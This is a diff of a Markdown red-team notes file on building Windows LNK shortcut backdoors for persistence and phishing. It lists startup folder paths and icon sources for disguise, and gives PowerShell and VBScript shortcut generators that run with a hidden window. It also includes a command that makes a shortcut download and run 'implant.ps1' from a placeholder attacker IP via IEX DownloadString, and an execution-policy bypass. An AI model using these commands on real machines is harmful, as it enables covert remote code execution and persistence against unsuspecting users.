@@ -16,9 +16,16 @@ C:\ProgramData\Microsoft\Windows\Start Menu
 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp
 ```
 
-## 02 - Generate Shortcut
+## 02 - Custom Icons
 
-### 2.1 - Powershell
+```
+C:\Windows\System32\msi.dll
+C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.exe
+```
+
+## 03 - Generate Shortcut
+
+### 3.1 - Powershell
 
 Note: The **TargetPath** has a limit of 260 characters long. If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`.
 
@@ -44,12 +51,12 @@ $Shortcut.Description = "A shortcut backdoor"
 # $Shortcut.IconLocation = 'C:\path\to\icon.ico'
 $Shortcut.IconLocation = 'shell32.dll,21'
 $Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
-$Shortcut.WindowStyle = 7
+$Shortcut.WindowStyle = 7   # 1 - Normal, 3 - Maximized, 7 - Minimized
 $Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
 $Shortcut.Save()
 ```
 
-### 2.2 - VBScript
+### 3.2 - VBScript
 
 ```vbscript
 Set ObjectWScript = WScript.CreateObject("WScript.Shell")
@@ -78,7 +85,7 @@ $ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.ex
 $ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\cmd.exe" "/c powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1'))""" shortcut_file.lnk
 ```
 
-## 03 - Use Cases
+## 04 - Use Cases
 
 ```
 $ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell -ep bypass -f implant.ps1" shortcut_file.lnk
@@ -144,3 +151,14 @@ TODO: Provide use cases if any
 ### Osanda
 
 - [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+
+### Assume Breach
+
+- [Assume Breach: Using LNK Files To Bypass Applocker](https://assume-breach.medium.com/home-grown-red-team-using-lnk-files-to-bypass-applocker-3fb1ecae291f)
+
+- [Assume Breach: LNK Phishing Revisited In 2023](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-revisited-in-2023-364daf70a06a)
+
+- [Assume Breach: LNK Phishing In 2023 Revisited…Again](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836)
+
+### Red Team Notes
+
